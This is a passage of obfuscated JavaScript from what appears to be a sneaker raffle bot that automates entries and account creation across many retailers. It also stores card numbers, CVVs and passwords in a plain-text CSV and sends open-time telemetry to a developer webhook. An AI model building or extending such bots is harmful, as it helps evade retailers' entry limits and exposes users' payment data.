                'function': async function (_0x2bea5f) {
                    var _0x1e15ef = await _0x522b60(), _0x447ee2 = _0x7a56eb['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4fae55 = _0x25c736['parse'](_0x447ee2, { 'header': !![] })['data'];
                    for (var _0x31f966 = 0x0; _0x31f966 < _0x4fae55['length']; _0x31f966++) {
                        var _0x2c1f61 = _0x4fae55[_0x31f966]['Store'], _0x3b09dc = _0x4fae55[_0x31f966]['Mode'];
                        for (var _0x299475 of _0x2cb44f) {
                            const _0x4ea4fe = _0x299475['name']['includes'](_0x2c1f61);
                            if (!_0x4ea4fe)
                                continue;
                            for (mode of _0x299475['modules']) {
                                if (mode['name'] == _0x3b09dc) {
                                    console['log']('Running\x20' + _0x16a3a0['cyan'](mode['name'])), await mode['function'](mode, [_0x4fae55[_0x31f966]], _0x1e15ef);
                                    var _0x42cc77 = _0x447ee2['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x7a56eb['writeFileSync']('../failed-tasks.csv', _0x42cc77);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x1a18ad = await _0x125485['get']('Answer');
                    if (_0x1a18ad['Answer']['toLowerCase']() == 'y') {
                        _0x7a56eb['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x140651(0x3e8);
                        return;
                    }
                    if (_0x1a18ad['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x140651(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x140651(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x5e5f81(_0x189379) {
    var _0x1941ac = await _0x522b60(), _0xb65d4a = _0x7a56eb['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x10f727 = _0x25c736['parse'](_0xb65d4a, { 'header': !![] })['data'];
    for (var _0x4739fe = 0x0; _0x4739fe < _0x10f727['length']; _0x4739fe++) {
        var _0x254164 = _0x10f727[_0x4739fe]['Store'], _0x4992a6 = _0x10f727[_0x4739fe]['Mode'];
        for (var _0x173b88 of _0x2cb44f) {
            const _0x3b73b3 = _0x173b88['name']['includes'](_0x254164);
            if (_0x3b73b3)
                for (mode of _0x2cb44f[_0x173b88]['modules']) {
                    const _0x434044 = mode['name']['includes'](_0x4992a6);
                    _0x434044 && (_0x189379 = mode['name'], await mode['function'](_0x189379, _0x10f727[_0x4739fe], _0x1941ac));
                }
        }
    }
}
async function _0x4bb3ed() {
    await _0x21ced4(), console['clear']();
    _0x342ed0['threads'] > 0x5 && (_0x342ed0['threads'] = 0x5);
    if (_0x4e463c != 'devkey' && _0x4e463c != 'devhook') {
        let _0x35cff3 = await _0x19ac31['autoUpdate']();
        if (_0x35cff3 === 'yes')
            return _0x37c998('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x503e2f == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x140651(0x2710);
        ;
    }
    await _0x162996(_0x503e2f);
    if (_0xe7ea16 === ![])
        return console['log']('Closing\x20Browser'), await _0x140651(0xbb8);
    else
        try {
            var _0x4f5c70 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x34b198
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x4e463c
                    }
                ]
            }];
            const _0x52a81d = { 'embeds': _0x4f5c70 };
            var _0xea7ce = await _0x11b6e5(null, null, 'open', ![]);
            const _0x3303df = { 'openDEVMSG': { 'embeds': [_0xea7ce] } };
            await _0x29bde2(_0x1db480, _0x3303df['openDEVMSG']);
            async function _0x29b023() {
                _0x1b4448('JRaffles\x20' + _0x4e463c), console['clear'](), console['log']('Hello\x20' + _0x16a3a0['cyan']('' + _0x34b198) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x4e463c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x22b7ce = 0x0; _0x22b7ce < _0x2cb44f['length'] - 0x4; _0x22b7ce++) {
                    if (_0x22b7ce >= 0xa) {
                        console['log']('\x20(' + _0x22b7ce + ')\x20[' + _0x2cb44f[_0x22b7ce]['name'] + ']');
                        continue;
                    }
                    if (_0x2cb44f[_0x22b7ce]['name'] === 'Reload\x20Settings' || _0x2cb44f[_0x22b7ce]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x22b7ce + ')\x20\x20[' + _0x2cb44f[_0x22b7ce]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x2cb44f['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x2cb44f['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x2cb44f['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x2cb44f['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x3c60fe();
                if (taskModule > _0x2cb44f['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x140651(0x3e8), _0x29b023();
                if (_0x2cb44f[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x562eba = await _0x522b60();
                            await _0x465d2e['function'](_0x465d2e, _0x562eba);
                        }
                        if (taskFunction == 0x2) {
                            var _0x562eba = await _0x522b60(), _0x545f5e = await _0x3757f6(_0x465d2e);
                            _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x545f5e), await _0x465d2e['function'](_0x465d2e, _0x545f5e, _0x562eba);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x562eba = await _0x522b60(), _0x545f5e = await _0x3757f6(_0x465d2e);
                                _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x545f5e), await _0x465d2e['function'](_0x465d2e, _0x545f5e, _0x562eba);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x562eba = await _0x522b60();
                                    await _0x465d2e['function'](_0x465d2e, _0x562eba);
                                }
                            }
                        }
                    } catch (_0x41d7e1) {
                        console['log'](_0x41d7e1), await _0x140651(0x7d0);
                    }
                    return _0x29b023();
                }
                if (_0x2cb44f[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                        var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x562eba = await _0x522b60(), _0x82e53 = await _0x3757f6(_0x465d2e);
                            _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x82e53), await _0x465d2e['function'](_0x465d2e, _0x82e53, _0x562eba);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x562eba = await _0x522b60(), _0x82e53 = await _0x3757f6(_0x465d2e);
                                _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x82e53), await _0x465d2e['function'](_0x465d2e, _0x82e53, _0x562eba);
                            }
                        }
                    } catch (_0x4839ec) {
                        console['log'](_0x4839ec), await _0x140651(0xfa0);
                    }
                    return _0x29b023();
                }
                if (_0x2cb44f[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                        var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x562eba = await _0x522b60(), _0x82e53 = await _0x3757f6(_0x465d2e);
                            _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x82e53), await _0x465d2e['function'](_0x465d2e, _0x82e53, _0x562eba);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x562eba = await _0x522b60(), _0x82e53 = await _0x3757f6(_0x465d2e);
                                _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x82e53), await _0x465d2e['function'](_0x465d2e, _0x82e53, _0x562eba);
                            }
                        }
                    } catch (_0x60da66) {
                        console['log'](_0x60da66), await _0x140651(0xfa0);
                    }
                    return _0x29b023();
                }
                if (_0x2cb44f[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x562eba = await _0x522b60();
                        return await _0x465d2e['function'](_0x465d2e, _0x562eba), _0x29b023();
                    }
                    var _0x562eba = await _0x522b60(), _0x2f24eb = await _0x3757f6(_0x465d2e);
                    return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x2f24eb), await _0x465d2e['function'](_0x465d2e, _0x2f24eb, _0x562eba), _0x29b023();
                }
                if (_0x2cb44f[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x562eba = await _0x522b60(), _0x2f24eb = await _0x3757f6(_0x465d2e);
                    return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x2f24eb), await _0x465d2e['function'](_0x465d2e, _0x2f24eb, _0x562eba), _0x29b023();
                }
                if (_0x2cb44f[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x562eba = await _0x522b60(), _0x2f24eb = await _0x3757f6(_0x465d2e);
                    return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x2f24eb), await _0x465d2e['function'](_0x465d2e, _0x2f24eb, _0x562eba), _0x29b023();
                }
                if (_0x2cb44f[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction], _0x562eba = await _0x522b60(), _0x2c47c0 = await _0x3757f6(_0x465d2e);
                    return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x2c47c0), await _0x465d2e['function'](_0x465d2e, _0x2c47c0, _0x562eba), await _0x140651(0x1388), _0x29b023();
                }
                if (_0x2cb44f[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x562eba = await _0x522b60(), _0x2f24eb = await _0x3757f6(_0x465d2e);
                    return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x2f24eb), await _0x465d2e['function'](_0x465d2e, _0x2f24eb, _0x562eba), _0x29b023();
                } else {
                    if (_0x2cb44f[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                        var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x562eba = await _0x522b60(), _0x4eba48 = await _0x3757f6(_0x465d2e);
                            return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x4eba48), await _0x465d2e['function'](_0x465d2e, _0x4eba48, _0x562eba), _0x29b023();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x562eba = await _0x522b60();
                                return await _0x465d2e['function'](_0x465d2e, null, _0x562eba), _0x29b023();
                            }
                        }
                        ;
                    } else {
                        if (_0x2cb44f[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                            var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction], _0x562eba = await _0x522b60(), _0x2c47c0 = await _0x3757f6(_0x465d2e);
                            return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x2c47c0), await _0x465d2e['function'](_0x465d2e, _0x2c47c0, _0x562eba), await _0x140651(0x1388), _0x29b023();
                        } else {
                            if (_0x2cb44f[taskModule]['name'] == 'Google\x20Forms') {
                                taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction], _0x562eba = await _0x522b60(), _0x2c47c0 = await _0x3757f6(_0x465d2e);
                                return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x2c47c0), await _0x465d2e['function'](_0x465d2e, _0x2c47c0, _0x562eba), await _0x140651(0x1388), _0x29b023();
                            } else {
                                if (_0x2cb44f[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x562eba = await _0x522b60(), _0x4eba48 = await _0x3757f6(_0x465d2e);
                                        return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x4eba48), await _0x465d2e['function'](_0x465d2e, _0x4eba48, _0x562eba), _0x29b023();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x562eba = await _0x522b60();
                                            return await _0x465d2e['function'](_0x465d2e, null, _0x562eba), _0x29b023();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x2cb44f[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                        var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x465d2e);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x2cb44f[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                            var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x562eba = await _0x522b60(), _0x4a59e0 = await _0x3757f6(_0x465d2e);
                                                return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x4a59e0), await _0x465d2e['function'](_0x465d2e, _0x4a59e0, _0x562eba), _0x29b023();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x562eba = await _0x522b60(), _0x4a59e0 = await _0x3757f6(_0x465d2e);
                                                    return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x4a59e0), await _0x465d2e['function'](_0x465d2e, _0x4a59e0, _0x562eba), _0x29b023();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x2cb44f[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                                var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x562eba = await _0x522b60(), _0x25c01c = await _0x3757f6(_0x465d2e);
                                                    return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x25c01c), await _0x465d2e['function'](_0x465d2e, _0x25c01c, _0x562eba), _0x29b023();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x562eba = await _0x522b60(), _0x25c01c = await _0x3757f6(_0x465d2e);
                                                        return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x25c01c), await _0x465d2e['function'](_0x465d2e, _0x25c01c, _0x562eba), _0x29b023();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x2cb44f[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                                    var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x562eba = await _0x522b60(), _0x3aa5d9 = await _0x3757f6(_0x465d2e);
                                                        return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x3aa5d9), await _0x465d2e['function'](_0x465d2e, _0x3aa5d9, _0x562eba), _0x29b023();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x562eba = await _0x522b60(), _0x3aa5d9 = await _0x3757f6(_0x465d2e);
                                                            return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x3aa5d9), await _0x465d2e['function'](_0x465d2e, _0x3aa5d9, _0x562eba), _0x29b023();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x2cb44f[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                                        var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x562eba = await _0x522b60(), _0x3aa5d9 = await _0x3757f6(_0x465d2e);
                                                            return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x3aa5d9), await _0x465d2e['function'](_0x465d2e, _0x3aa5d9, _0x562eba), _0x29b023();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x562eba = await _0x522b60(), _0x3aa5d9 = await _0x3757f6(_0x465d2e);
                                                                return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x3aa5d9), await _0x465d2e['function'](_0x465d2e, _0x3aa5d9, _0x562eba), _0x29b023();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x2cb44f[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                                            var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x562eba = await _0x522b60(), _0x13eaa8 = await _0x3757f6(_0x465d2e);
                                                                return _0x342ed0['shuffleTasks'] && await _0x1a52f5(_0x13eaa8), await _0x465d2e['function'](_0x13eaa8, _0x562eba), _0x29b023();
                                                            }
                                                        } else {
                                                            if (_0x2cb44f[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x140651(0x3e8), _0x29b023();
                                                            else {
                                                                if (_0x2cb44f[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x45a388 = _0x2cb44f[taskModule]['name'], _0x562eba = await _0x522b60();
                                                                    return await _0x113eb0(_0x45a388, _0x562eba), _0x29b023();
                                                                } else {
                                                                    if (_0x2cb44f[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x4ed838(_0x2cb44f[taskModule]['modules']);
                                                                        var _0x465d2e = _0x2cb44f[taskModule]['modules'][taskFunction];
                                                                        return await _0x465d2e['function'](_0x465d2e), _0x29b023();
                                                                    } else {
                                                                        if (_0x2cb44f[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x37dcbd = 0x0;
                                                                            for (const _0x2f3f9a in _0x342ed0) {
                                                                                console['log']('(' + _0x37dcbd + ')\x20' + _0x2f3f9a + '\x20:\x20' + _0x342ed0[_0x2f3f9a]), _0x37dcbd++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x37dcbd + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x5bcfd0 = await _0x3c0e3e();
                                                                            if (_0x5bcfd0 == _0x37dcbd)
                                                                                return _0x29b023();
                                                                            console['clear'];
                                                                            var _0x13b107 = 0x0;
                                                                            for (var _0x1a5a7e in _0x342ed0) {
                                                                                if (_0x5bcfd0 == _0x13b107) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1a5a7e + '\x20:'), _0x342ed0[_0x1a5a7e] = await _0x3ffb2d(), _0x7a56eb['writeFileSync']('../settings.json', JSON['stringify'](_0x342ed0));
                                                                                    break;
                                                                                } else
                                                                                    _0x13b107++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x140651(0xbb8), _0x29b023();
                                                                        } else {
                                                                            if (_0x2cb44f[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x21ced4(), _0x29b023();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x2cb44f[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x4d1d2b = await _0x3a44c8();
                                                                                    _0x4d1d2b == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x1aceda(), await afewFunction(_0x4fe56f[_0x2c5dd7], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x140651(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x29b023();
            } catch (_0x5f4877) {
                return console['log'](_0x5f4877), await _0x140651(0x2710), _0x29b023();
            }
        } catch (_0xe5a7d9) {
            return console['log'](_0xe5a7d9), await _0x140651(0x3a98);
        }
}
;
_0x1b4448('JRaffles\x20' + _0x4e463c);
try {
    _0x21ced4(), _0x4bb3ed();
} catch (_0x4d8898) {
    console['log'](_0x4d8898);
}